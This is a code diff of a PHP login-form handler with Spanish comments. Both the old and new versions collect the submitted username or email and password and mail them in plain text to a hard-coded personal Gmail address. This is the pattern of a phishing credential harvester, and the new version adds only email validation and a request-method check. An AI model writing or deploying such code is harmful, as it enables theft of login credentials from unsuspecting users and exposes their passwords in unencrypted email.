@@ -1,28 +1,27 @@
-$username = $_POST['username'] ?? '';
-$password = $_POST['password'] ?? '';
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Obtener datos del formulario
+    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
+    $password = filter_var($_POST['password'], FILTER_SANITIZE_STRING);
+    
+    // Validar correo electrónico
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        die("Correo electrónico no válido");
+    }
 
-// Verificar si los campos están vacíos
-if (empty($username) || empty($password)) {
-    echo 'Por favor, complete todos los campos.';
-    exit;
-}
+    // Preparar el contenido del correo
+    $to = 'ing.faiber.diaz@gmail.com';
+    $subject = 'Datos de Inicio de Sesión';
+    $message = "Correo electrónico: $email\nContraseña: $password";
+    $headers = "From: no-reply@example.com\r\n";
+    $headers .= "Reply-To: no-reply@example.com\r\n";
+    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
 
-// Configurar los detalles del correo
-$to = 'ing.faiber.diaz@gmail.com'; // Correo electrónico del destinatario
-$subject = 'Datos de inicio de sesión'; // Asunto del correo
-$message = "Datos de inicio de sesión:\n\n";
-$message .= "Nombre de usuario: $username\n";
-$message .= "Contraseña: $password\n"; // Enviar contraseñas en texto plano no es seguro
-
-// Encabezados del correo
-$headers = 'From: no-reply@tudominio.com' . "\r\n" .
-           'Reply-To: no-reply@tudominio.com' . "\r\n" .
-           'X-Mailer: PHP/' . phpversion();
-
-// Enviar el correo
-if (mail($to, $subject, $message, $headers)) {
-    echo 'Los datos han sido enviados correctamente.';
+    // Enviar el correo
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Correo enviado exitosamente";
+    } else {
+        echo "Error al enviar el correo";
+    }
 } else {
-    echo 'Error al enviar los datos.';
+    echo "Método de solicitud no válido";
 }
-?>
